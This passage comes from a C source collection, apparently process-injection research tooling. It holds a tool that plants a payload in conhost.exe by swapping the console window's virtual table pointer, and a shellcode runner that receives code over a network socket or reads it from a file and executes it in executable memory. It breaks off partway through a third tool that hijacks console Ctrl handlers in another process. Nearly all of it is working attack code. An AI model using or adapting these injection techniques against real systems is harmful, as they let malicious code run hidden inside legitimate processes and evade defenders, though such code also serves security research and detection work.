    ULONG_PTR     GetWindowRect;
} ConsoleWindow;

// just here for reference. it's not used here.
typedef struct _userData_t {
    ULONG_PTR vTable;     // gets replaced with new table pointer
    ULONG_PTR pUnknown;   // some undefined memory pointer
    HWND      hWnd;
    BYTE      buf[100];   // don't care
} UserData;

// given a process id for a console process, it will return 
// the process id for conhost.exe
DWORD conhostId(DWORD dwPPid) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          dwPid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        // conhost?
        if (lstrcmpi(L"conhost.exe", pe32.szExeFile)==0) {
          // child process?
          if (pe32.th32ParentProcessID == dwPPid) {
            // return process id
            dwPid = pe32.th32ProcessID;
            break;
          }
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    
    return dwPid;
}

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len, rd=0;
    
    // 1. open the file
    hf = CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if (hf != INVALID_HANDLE_VALUE){
      // get file size
      len = GetFileSize(hf, 0);
      // allocate memory
      *pic = malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID conhostInject(LPVOID payload, DWORD payloadSize) {
    HWND          hwnd;
    DWORD64       udptr;
    DWORD         pid, ppid;
    SIZE_T        wr;
    HANDLE        hp;
    ConsoleWindow cw;
    LPVOID        cs, ds;
    ULONG_PTR     vTable;
    
    // 1. Obtain handle and process id for a console window 
    //   (this assumes one already running)
    hwnd = FindWindow(L"ConsoleWindowClass", NULL);
    
    GetWindowThreadProcessId(hwnd, &ppid);

    // 2. Obtain the process id for the host process 
    pid = conhostId(ppid);
    
    // csrss.exe spawns conhost.exe on 32-bit windows 
    if (pid==0) {
      printf("parent id is %ld\nunable to obtain pid of conhost.exe\n", ppid);
      return;
    }
    // 3. Open the conhost.exe process
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // 4. Allocate RWX memory and copy the payload there
    cs = VirtualAllocEx(hp, NULL, payloadSize, 
      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 5. Read the address of current virtual table
    udptr = (DWORD64)GetWindowLongPtr(hwnd, GWLP_USERDATA);
    
    printf("GWLP_USERDATA : %llx\n", udptr);
    
    ReadProcessMemory(hp, (LPVOID)udptr, 
        (LPVOID)&vTable, sizeof(ULONG_PTR), &wr);
    
    printf("Table         : %p\n", vTable);
    
    // 6. Read the current virtual table into local memory
    ReadProcessMemory(hp, (LPVOID)vTable, 
      (LPVOID)&cw, sizeof(ConsoleWindow), &wr);
      
    // 7. Allocate RW memory for the new virtual table
    ds = VirtualAllocEx(hp, NULL, sizeof(ConsoleWindow), 
      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // 8. update the local copy of virtual table with 
    //    address of payload and write to remote process
    cw.GetWindowHandle = (ULONG_PTR)cs;
    WriteProcessMemory(hp, ds, &cw, sizeof(ConsoleWindow), &wr); 

    // 9. Update pointer to virtual table in remote process
    WriteProcessMemory(hp, (LPVOID)udptr, &ds, 
      sizeof(ULONG_PTR), &wr); 
      
    printf("Set breakpoint on %p\nWindow Handle : %p", 
      (PVOID)cs, (PVOID)hwnd
      );
    getchar();
    
    // 10. Trigger execution of the payload
    SendMessage(hwnd, WM_SETFOCUS, 0, 0);

    // 11. Restore pointer to original virtual table
    WriteProcessMemory(hp, (LPVOID)udptr, &vTable, 
      sizeof(ULONG_PTR), &wr);
    
    // 12. Release memory and close handles
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0,  MEM_RELEASE);
    
    CloseHandle(hp);
}

int main(void) {
    PWCHAR   *argv;
    int      argc;
    LPVOID   payload;
    DWORD    payloadSize;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if(argc != 2) { wprintf(L"usage: chost <payload>\n"); return 0; }

    payloadSize = readpic(argv[1], &payload);
    if(payloadSize == 0) { wprintf(L"unable to read from %s\n", argv[1]); return 0; }
    
    conhostInject(payload, payloadSize);
    return 0;
}

```

`conhost/runsc.c`:

```c

/**
  Copyright © 2016-2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#if defined(_WIN32) || defined(_WIN64)
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0502
#endif
#define WIN
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_  
#endif
#include <windows.h>
#include <shlwapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#define close closesocket
#define SHUT_RDWR SD_BOTH
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <signal.h>
#include <fcntl.h>
#endif

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/stat.h>

#define RSC_CLIENT 0
#define RSC_SERVER 1
#define RSC_EXEC   2

#define RSC_SEND   0
#define RSC_RECV   1

#define DEFAULT_PORT "4444"

// structure for parameters
typedef struct _args_t {
  int      s, r;
  char     *port, *address, *file;
  #ifdef WIN
  char     *modules;
  #endif
  int      port_nbr, ai_family, mode, sim, tx_mode, ai_addrlen, dbg;
  struct   sockaddr *ai_addr;
  struct   sockaddr_in v4;
  struct   sockaddr_in6 v6;
  char     ip[INET6_ADDRSTRLEN];
  uint32_t code_len;
  void     *code;
} args_t;

#ifdef WIN
/**F*****************************************************************/
void xstrerror (char *fmt, ...) 
/**
 * PURPOSE : Display windows error
 *
 * RETURN :  Nothing
 *
 * NOTES :   None
 *
 *F*/
{
  char    *error=NULL;
  va_list arglist;
  char    buffer[2048];
  DWORD   dwError=GetLastError();
  
  va_start (arglist, fmt);
  wvnsprintf (buffer, sizeof(buffer) - 1, fmt, arglist);
  va_end (arglist);
  
  if (FormatMessage (
      FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
      NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
      (LPSTR)&error, 0, NULL))
  {
    printf ("[ %s : %s\n", buffer, error);
    LocalFree (error);
  } else {
    printf ("[ %s : %i\n", buffer, dwError);
  }
}
#else
#define xstrerror printf
#endif

char *addr2ip(args_t *p)
{
  void *src;
#ifdef WIN
  DWORD ip_size=INET6_ADDRSTRLEN;
  WSAAddressToString (p->ai_addr, p->ai_addrlen, 
    NULL, (char*)p->ip, &ip_size);
#else
  if (p->ai_family==AF_INET) {
    src=(void*)&p->v4.sin_addr;
  } else {
    src=(void*)&p->v6.sin6_addr;
  }
  inet_ntop(p->ai_family, src, p->ip, INET6_ADDRSTRLEN);
#endif
  return p->ip;
}

int init_network (args_t *p)
/**
 * PURPOSE : initialize winsock for windows, resolve network address
 *
 * RETURN :  1 for okay else 0
 *
 * NOTES :   None
 *
 *F*/
{
  struct addrinfo *list=NULL, *e=NULL;
  struct addrinfo hints;
  int             r, t;
  
  // initialize winsock if windows
#ifdef WIN
  WSADATA wsa;
  WSAStartup (MAKEWORD (2, 0), &wsa);
#endif

  r=0;
  // set network address length to zero
  p->ai_addrlen = 0;
  
  // if no address supplied
  if (p->address==NULL)
  {
    // is it ipv4?
    if (p->ai_family==AF_INET) {
      p->v4.sin_family      = AF_INET; 
      p->v4.sin_port        = htons((u_short)p->port_nbr);
      p->v4.sin_addr.s_addr = INADDR_ANY;
      p->ai_addr            = (struct sockaddr*)&p->v4;
      p->ai_addrlen         = sizeof (struct sockaddr_in);
    } else {
      // else it's ipv6
      p->v6.sin6_family     = AF_INET6;
      p->v6.sin6_port       = htons((u_short)p->port_nbr);
      p->v6.sin6_addr       = in6addr_any;
      p->ai_addr            = (struct sockaddr*)&p->v6;
      p->ai_addrlen         = sizeof (struct sockaddr_in6);
    }
  } else {
    memset (&hints, 0, sizeof (hints));

    hints.ai_flags    = AI_PASSIVE;
    hints.ai_family   = p->ai_family;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;    
    
    // get all network addresses
    t=getaddrinfo (p->address, p->port, &hints, &list);
    if (t == 0) 
    {
      for (e=list; e!=NULL; e=e->ai_next) 
      {
        // copy to ipv4 structure
        if (p->ai_family==AF_INET) {
          memcpy (&p->v4, e->ai_addr, e->ai_addrlen);
          p->ai_addr     = (struct sockaddr*)&p->v4;        
        } else {
          // ipv6 structure
          memcpy (&p->v6, e->ai_addr, e->ai_addrlen);
          p->ai_addr     = (struct sockaddr*)&p->v6;
        }
        // assign size of structure
        p->ai_addrlen = e->ai_addrlen;
        break;
      }
      freeaddrinfo (list);
    } else {
      xstrerror ("getaddrinfo");
    }
  }
  return p->ai_addrlen;
}

void debug(void *bin) 
{
  // 
  //__builtin_trap();
  //raise(SIGTRAP);
}

// allocate read/write and executable memory
// copy data from p->code and execute
void xcode(args_t *p)
{
  void *bin;
  int  i;
  int  fd[2048];
  
  if (p->code_len == 0) {
    printf("[ no code to execute.\n");
    return;
  }
  printf ("[ executing code...");
    
#ifdef WIN
  bin=VirtualAlloc (0, p->code_len, 
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
#else
  bin=mmap (0, p->code_len, 
    PROT_EXEC | PROT_WRITE | PROT_READ, 
    MAP_ANON  | MAP_PRIVATE, -1, 0);
#endif
  if (bin!=NULL)
  {
    memcpy (bin, p->code, p->code_len);
    // create file/socket descriptors to simulate real system 
    // created interesting results on openbsd with limits
    // to how many files could be open at once..
    // 
    if (p->sim) {
      #ifndef WIN
      for (i=0; i<p->sim && p->sim<2048; i++) {
        fd[i]=socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      }
      #else
      // todo
      for (i=0; i<p->sim && p->sim<2048; i++) {
      }
      #endif
    }
    
    // debug the code?
    if (p->dbg) {
      #if defined(_WIN32) || defined(_WIN64)
        DebugBreak();
      #else
        raise(SIGTRAP);
      #endif    
    }
    // execute
    ((void(*)())bin)();
    printf("OK!\n");
    if (p->sim) {
      #ifndef WIN
      // close all descriptors
      for (i=0; i<p->sim && p->sim<2048; i++) {
        close(fd[i]);
      }
      #else
        // todo
      #endif
    }
#ifdef WIN
    VirtualFree (bin, 0, MEM_RELEASE );
#else
    munmap (bin, p->code_len);
#endif
  }
}

void send_data(args_t *p, int s) {
    FILE     *fd;
    int      outlen, len, opt;
    uint32_t sum;
    uint8_t  buf[BUFSIZ];
        
    // open file for read in binary mode
    printf ("[ opening %s for read\n", p->file);
    fd = fopen(p->file, "rb");
    
    if (fd != NULL)
    {
      // send contents of file
      printf ("[ sending data\n");
      for (;;) {
        // read block
        outlen = fread(buf, sizeof(uint8_t), BUFSIZ, fd);
        // zero or less indicates EOF
        if (outlen <= 0) break;
        // send contents
        for (sum=0; sum<outlen; sum += len) {
          len=send (s, &buf[sum], outlen - sum, 0);
          if (len <= 0) break;
        }
        p->code_len += sum;
        if (outlen != sum) break;
      }
      printf ("[ sent %i bytes\n", p->code_len);
      fclose(fd);
    }
}

void recv_data(args_t *p, int s) {
    int            opt, r;
    fd_set         fds;
    struct timeval tv;
    void           *pv;
    
    p->code_len = 0;
    p->code     = malloc(BUFSIZ);
   
    // set to non-blocking mode
    #ifdef WIN
      opt=1;
      ioctlsocket (s, FIONBIO, (u_long*)&opt);
    #else
      opt=fcntl(s, F_GETFL, 0);
      fcntl(s, F_SETFL, opt | O_NONBLOCK);
    #endif
    // keep reading until remote disconnects or we run out of memory
    printf ("[ receiving data\n");
    
    for (;;) {
      FD_ZERO(&fds);
      FD_SET(s, &fds);
    
      tv.tv_sec  = 5;
      tv.tv_usec = 0;
      r = select(FD_SETSIZE, &fds, 0, 0, &tv);
      
      if (r <= 0) {
        printf ("[ waiting for data timed out or failed\n");
        break;
      }
      // receive a block
      r = recv(s, (uint8_t*)p->code + p->code_len, BUFSIZ, 0);
      if (r <= 0) break;
      p->code_len += r;
      // resize buffer
      pv = realloc(p->code, p->code_len + BUFSIZ);
      // on error, free pointer
      if(pv == NULL) {
        p->code_len = 0;
        free(p->code);
        p->code = NULL;
        printf("[ error: out of memory.\n");
        break;
      }
      p->code = pv;
    }
    if(p->code_len != 0) {
      printf ("[ received %i bytes\n", p->code_len);
    }
}

// 
int ssr (args_t *p)
/**
 * PURPOSE : send a shellcode or receive one from remote system and execute it
 *
 * RETURN :  0 or length of shellcode sent/received
 *
 * NOTES :   None
 *
 *F*/
{
    int             s, opt, r, t;
    fd_set          fds;
    struct timeval  tv;
    
    p->code_len=0;
    
    // create socket
    printf ("[ creating socket\n");
    s = socket(p->ai_family, SOCK_STREAM, IPPROTO_TCP);
    if (s < 0) return 0;
        
    // ensure we can reuse socket
    t=1;
    setsockopt (s, SOL_SOCKET, SO_REUSEADDR, (char*)&t, sizeof (t));
    
    // bind to port
    printf ("[ binding to port %s\n", p->port);
    r = bind(s, p->ai_addr, p->ai_addrlen);
    if (r == 0) {
      // listen
      r = listen (s, 1);
      if (r == 0) {
        printf ("[ waiting for connections on %s\n", addr2ip(p));
        if (r == 0) {
          t = accept(s, p->ai_addr, &p->ai_addrlen);
          printf ("[ accepting connection from %s\n", addr2ip(p));
          if (t > 0) {
            if (p->tx_mode == RSC_SEND) {
              send_data(p, t);
            } else {
              recv_data(p, t);
              xcode(p);
            }
          }
        }
        // close socket to peer
        shutdown(t, SHUT_RDWR);
        close(t);
      } else {
        perror("listen");
      }
    } else {
      perror("bind");
    }
    // close listening socket
    shutdown(s, SHUT_RDWR);
    close(s);
    
    return p->code_len;
}

/**F*****************************************************************/
int csr (args_t *p)
/**
 * PURPOSE : opens connection to remote system and sends shellcode
 *
 * RETURN :  0 or 1
 *
 * NOTES :   None
 *
 *F*/
{
    int            s, r, opt;
    fd_set         fds;
    struct timeval tv;
    
    printf ("[ creating socket\n");
    s = socket(p->ai_family, SOCK_STREAM, IPPROTO_TCP);
    if (s < 0) return 0;
    
    // try connect to remote
    printf ("[ connecting to %s\n", addr2ip(p));
    r = connect(s, p->ai_addr, p->ai_addrlen);
    
    if (r == 0) {
      if (p->tx_mode==RSC_SEND) {
        send_data(p, s);
      } else {
        recv_data(p, s);
        xcode(p);
      }
    } else {
      xstrerror("connect");
    }
    printf ("[ closing connection\n");
    shutdown(s, SHUT_RDWR);
    close(s);
    return 1;
}

/**F*****************************************************************/
void xfile(args_t *p)
/**
 * PURPOSE : read contents of shellcode and attempt to execute it locally
 *
 * RETURN :  Nothing
 *
 * NOTES :   None
 *
 *F*/
{
    FILE    *fd;
    int     len;
    void    *pv;
    
    p->code_len = 0;
    p->code     = NULL;
    
    printf ("[ reading code from %s\n", p->file);
    fd = fopen(p->file, "rb");
    
    if (fd == NULL) {
      xstrerror("fopen(\"%s\")", p->file);
      return;
    }
    // read contents of file
    for (;;) {
      // first loop? allocate block
      if(p->code == NULL) {
        p->code = malloc(BUFSIZ);
      }
      // read a block of data
      len = fread((uint8_t*)p->code + p->code_len, sizeof(uint8_t), BUFSIZ, fd);
      if (len <= 0) break;
      p->code_len += len;
      // resize buffer for next read
      pv = realloc(p->code, p->code_len + BUFSIZ);
      
      if(pv == NULL) {
        p->code_len = 0;
        free(p->code);
        p->code = NULL;
        printf("[ error: out of memory!.\n");
        break;
      }
      p->code = pv;
    }
    fclose(fd);
    
    if(p->code_len != 0) {
      xcode(p);
    }
}

#ifdef WIN
void load_modules(char *names) {
    HMODULE mod;
    char *p = strtok(names, ";,");
    
    while (p != NULL) {
      printf ("[ loading %s...", p);
      mod = LoadLibrary(p);
      
      printf ("%s\n", mod==NULL ? "FAILED" : "OK");
      
      p = strtok(NULL, ";,");
    }
}
#endif

/**F*****************************************************************/
void usage (void) {
    printf ("\n  usage: runsc <address> [options]\n");
    printf ("\n  -4            Use IP version 4 (default)");
    printf ("\n  -6            Use IP version 6");
    printf ("\n  -l            Listen mode (required when listening on specific interface)");
    #ifdef WIN
    printf ("\n  -m <dll>      Loads DLL modules. Each one separated by comma or semi-colon");
    #endif
    printf ("\n  -f <file>     Read PIC from <file>");
    printf ("\n  -s <count>    Simulate real process by creating file descriptors");
    printf ("\n  -p <number>   Port number to use (default is %s)", DEFAULT_PORT);
    printf ("\n  -x            Execute PIC (requires -f)");
    printf ("\n\n  Press any key to continue . . .");
    getchar ();
    
    exit (0);
}

/**F*****************************************************************/
char* getparam (int argc, char *argv[], int *i) {
    int n=*i;
    if (argv[n][2] != 0) {
      return &argv[n][2];
    }
    if ((n+1) < argc) {
      *i=n+1;
      return argv[n+1];
    }
    printf ("[ %c%c requires parameter\n", argv[n][0], argv[n][1]);
    exit (0);
}

void parse_args (args_t *p, int argc, char *argv[]) {
    int  i;
    char opt;

    // for each argument
    for (i=1; i<argc; i++)
    {
      // is this option?
      if (argv[i][0]=='-' || argv[i][1]=='/')
      {
        // get option value
        opt=argv[i][1];
        switch (opt)
        {
          case '4':
            p->ai_family=AF_INET;
            break;
          case '6':     // use ipv6 (default is ipv4)
            p->ai_family=AF_INET6;
            break;
          case 'x':     // execute PIC, requires -f
            p->mode=RSC_EXEC;
            break;
          case 'd':     // debug the code
            p->dbg=1;
            break;
          case 'f':     // file
            p->file=getparam(argc, argv, &i);
            break;
          case 'l':     // listen for incoming connections
            p->mode=RSC_SERVER;
            break;
          #ifdef WIN  
          case 'm':     // windows only, loads modules required by shellcode
            p->modules = getparam(argc, argv, &i);
            break;
          #endif          
          case 's':     // create file descriptors before execution
            p->sim=atoi(getparam(argc, argv, &i));
            break;
          case 'p':     // port number
            p->port=getparam(argc, argv, &i);
            p->port_nbr=atoi(p->port);
            break;
          case '?':     // display usage
          case 'h':
            usage ();
            break;
          default:
            printf ("[ unknown option %c\n", opt);
            usage();
            break;
        }
      } else {
        // assume it's hostname or ip
        p->address=argv[i];
        p->mode=RSC_CLIENT;
      }
    }
}

int main (int argc, char *argv[]) {
    args_t args;
    struct stat st;
    
    #ifdef WIN
      // 
      PVOID   OldValue=NULL;
      WSADATA wsa;
      
      //Wow64DisableWow64FsRedirection (&OldValue);
      LoadLibrary("ws2_32");
      LoadLibrary("advapi32");
      
      WSAStartup(MAKEWORD(2,0), &wsa);
    #endif
    
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    
    memset (&args, 0, sizeof(args));
    
    // set default parameters
    args.address   = NULL;
    args.file      = NULL;
    args.ai_family = AF_INET;
    args.port      = DEFAULT_PORT;
    args.port_nbr  = atoi(args.port);
    args.mode      = -1;
    args.tx_mode   = -1;
    args.sim       = 0;
    args.dbg       = 0;
    
    printf ("\n[ run shellcode v0.2\n");
    
    parse_args(&args, argc, argv);
    
    // check if we have file parameter and it accessible
    if (args.file!=NULL) {
      if (stat (args.file, &st)) {
        printf ("[ unable to access %s\n", args.file);
        return 0;
      }
    }
    
    #ifdef WIN
    if (args.modules != NULL) {
      load_modules(args.modules);
    }
    #endif
    // if mode is executing
    if (args.mode == RSC_EXEC) {
      if (args.file != NULL) {
        xfile(&args);
        return 0;
      } else {
        printf ("\n[ you've used -x without supplying file with -f");
        return 0;
      }
    }
    if (init_network(&args)) {
      // if no file specified, we receive and execute data
      args.tx_mode = (args.file==NULL) ? RSC_RECV : RSC_SEND;
      
      // if mode is -1, we listen for incoming connections
      if (args.mode == -1) {
        args.mode=RSC_SERVER;
      }
      
      // if no file specified, set to receive one
      if (args.tx_mode == -1) {
        args.tx_mode = RSC_RECV;
      }
      
      if (args.mode == RSC_SERVER) {
        ssr (&args);
      } else {
        csr (&args);
      }
    }
    if(args.code_len != 0) {
      free(args.code);
    }
    return 0;
}

```

`ctrlinject/ctrlinject.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"

typedef HRESULT(WINAPI *_RtlEncodeRemotePointer)(
  HANDLE    ProcessHandle,
  PVOID     Ptr,
  PVOID     *EncodedPtr);

typedef HRESULT(WINAPI *_RtlDecodeRemotePointer)(
  HANDLE    ProcessHandle,
  PVOID     Ptr,
  PVOID     *DecodedPtr);

BOOL WINAPI HandlerRoutine(DWORD dwCtrlType) {
    switch ( dwCtrlType ) {
      case CTRL_C_EVENT:
        return TRUE;
      default:
        return FALSE;
    }
}

// locate the virtual address of HandlerList in kernelbase.dll
LPVOID GetHandlerListVA(VOID) {
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    DWORD                 i, j, cnt;
    PULONG_PTR            ds;
    PHANDLER_ROUTINE      *HandlerList;
    HMODULE               m;
    LPVOID                ptr, va = NULL;
    
    // set handler
    SetConsoleCtrlHandler(HandlerRoutine, TRUE); 
    
    m   = GetModuleHandle(L"kernelbase.dll");
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)".data") {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    
    // for each pointer
    for(i=0; i<cnt; i++) {
      // if not heap pointer, skip it
      if(!IsHeapPtr((LPVOID)ds[i])) continue;
      // assume this is the HandlerList array
      HandlerList = (PHANDLER_ROUTINE*)ds[i];
      // decode second pointer in list
      ptr = DecodePointer((LPVOID)HandlerList[1]);
      // is it our handler?
      if(ptr == HandlerRoutine) {
        // save virtual address and exit loop
        va = &ds[i];
        break;
      }
    }
    // remove handler
    SetConsoleCtrlHandler(HandlerRoutine, FALSE);
    return va;
}

VOID ctrl_list(DWORD pid) {
    PROCESSENTRY32          pe;
    HANDLE                  ss, hp;
    PHANDLER_ROUTINE        *HandlerList, Handler;
    SIZE_T                  rd;
    LPVOID                  hl_va, ptr;
    DWORD                   i;
    HRESULT                 res;
    _RtlDecodeRemotePointer RtlDecodeRemotePointer;
    
    hl_va = GetHandlerListVA();
    
    if(hl_va == NULL) {
      wprintf(L"WARNING: Unable to resolve address of HandlerList\n");
      return;
    }
    
    RtlDecodeRemotePointer = (_RtlDecodeRemotePointer)
      GetProcAddress(GetModuleHandle(L"ntdll"), "RtlDecodeRemotePointer");
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    pe.dwSize = sizeof(PROCESSENTRY32);

    if(Process32First(ss, &pe)){
      do {
        if(pid != 0 && pe.th32ProcessID != pid) continue;
        
        hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
        if(hp != NULL) {
          SymInitialize(hp, NULL, TRUE);
          
          // read the heap pointer from remote process
          ReadProcessMemory(hp, hl_va, &HandlerList, sizeof(ULONG_PTR), &rd);        
          
          printf("\nHandlerList: %p for %04i : %ws\n", 
            (LPVOID)HandlerList, pe.th32ProcessID, pe.szExeFile);
            
          // read each pointer
          for(i=0;;i++) {
            ptr = (PBYTE)HandlerList + (i * sizeof(ULONG_PTR)); 
            ReadProcessMemory(hp, ptr, &ptr, sizeof(ULONG_PTR), &rd);
            RtlDecodeRemotePointer(hp, ptr, (PVOID*)&Handler);
            if(!IsCodePtrEx(hp, Handler)) break;
            printf("%p : %ws\n", Handler, addr2sym(hp, Handler));
          }
          SymCleanup(hp);
          CloseHandle(hp);
        }
      } while(Process32Next(ss, &pe));
    }
    CloseHandle(ss);
}

// simulate CTRL+C
void SendCtrlC(HWND hWnd) {
    INPUT ip;
    
    SetForegroundWindow(hWnd);
    
    ip.type           = INPUT_KEYBOARD;
    ip.ki.wScan       = 0;
    ip.ki.time        = 0;
    ip.ki.dwExtraInfo = 0;
    
    ip.ki.wVk         = VK_CONTROL;
    ip.ki.dwFlags     = 0;
    SendInput(1, &ip, sizeof(INPUT));

    ip.ki.wVk         = 'C';
    ip.ki.dwFlags     = 0;
    SendInput(1, &ip, sizeof(INPUT));
    
    ip.ki.wVk         = 'C';
    ip.ki.dwFlags     = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
    
    ip.ki.wVk         = VK_CONTROL;
    ip.ki.dwFlags     = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
    
    Sleep(1000);
}

void ctrl_inject(DWORD pid, LPVOID payload, DWORD payloadSize) {
    HANDLE                  hp;
    SIZE_T                  rd, wr;
    DWORD                   i, id;
    HWND                    hw = NULL;
    PHANDLER_ROUTINE        *HandlerList, Handler;
    LPVOID                  hl_va, heap_ptr, enc_ptr, last_ptr, cs;
    _RtlDecodeRemotePointer RtlDecodeRemotePointer;
    _RtlEncodeRemotePointer RtlEncodeRemotePointer;
    
    // 1. Resolve virtual address of HandlerList and function encoders
    for(;;) {
      hw = FindWindowEx(NULL, hw, L"ConsoleWindowClass", NULL);
      if(hw == NULL) break;
      
      GetWindowThreadProcessId(hw, &id);
      if(id == pid) break;
    }
    
    hl_va = GetHandlerListVA();
    
    RtlDecodeRemotePointer = (_RtlDecodeRemotePointer)
      GetProcAddress(GetModuleHandle(L"ntdll"), 
      "RtlDecodeRemotePointer");

    RtlEncodeRemotePointer = (_RtlEncodeRemotePointer)
      GetProcAddress(GetModuleHandle(L"ntdll"), 
      "RtlEncodeRemotePointer");

    if(hw                     == 0    ||
       hl_va                  == NULL ||
       RtlDecodeRemotePointer == NULL ||
       RtlDecodeRemotePointer == NULL) return;
       
    // 2. Open process for read,write and allocate operations
    hp = OpenProcess(
      PROCESS_VM_OPERATION |
      PROCESS_VM_READ      |
      PROCESS_VM_WRITE, 
      FALSE, 
      pid);
      
    if(hp == NULL) return;

    // 3. Read the heap pointer from remote process
    ReadProcessMemory(hp, hl_va, 
      &HandlerList, sizeof(ULONG_PTR), &rd);        
      
    // read each pointer to find last one in list
    for(last_ptr = NULL, i = 0;; i++) {
      heap_ptr = (PBYTE)HandlerList + (i * sizeof(ULONG_PTR)); 
      
      // read encoded pointer
      ReadProcessMemory(hp, heap_ptr, &enc_ptr, sizeof(ULONG_PTR), &rd);
      
      // decode it
      RtlDecodeRemotePointer(hp, enc_ptr, (PVOID*)&Handler);
      
      // if this doesn't point to code in remote process, exit loop
      if(!IsCodePtrEx(hp, Handler)) break;

      // save heap address of this handler
      last_ptr = heap_ptr;
    }
    
    // if we have a heap address of handler
